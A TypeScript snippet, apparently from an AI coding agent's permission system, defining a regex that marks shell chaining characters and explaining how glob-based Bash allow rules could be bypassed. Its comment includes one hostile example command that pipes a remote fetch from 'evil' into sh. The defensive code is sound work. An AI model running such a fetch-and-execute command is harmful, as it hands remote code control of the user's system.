/**
 * Shell characters that chain, redirect, substitute or group one command into another, and a
 * newline, which starts a second command.
 *
 * A `Bash(<glob>)` rule is a glob over the whole command string and `*` crosses anything, so
 * `Bash(npm *)` would also match `npm x && curl evil | sh`. Book cannot express "and nothing else"
 * in its glob language and does not parse shell, so two places treat a command containing any of
 * these as compound, whether the character is quoted or not:
 *
 * - the "Always allow" ladder declines to offer a widened rule when the command it learned from is
 *   already compound: the user would be generalizing from an example whose shape they cannot see
 *   repeated. It tests only the command's first line today, so a newline never reaches it
 *   (tracked in #500);
 * - the capability layer (`allowed-tools` of a command, skill or agent role) refuses such a command
 *   under a `Bash(<glob>)` rule, so the model sends each command as its own call. It reads the
 *   whole command, trimmed, and also refuses an inner carriage return.
 */
export const SHELL_CHAINING = /[;&|><`$(){}\n]/;
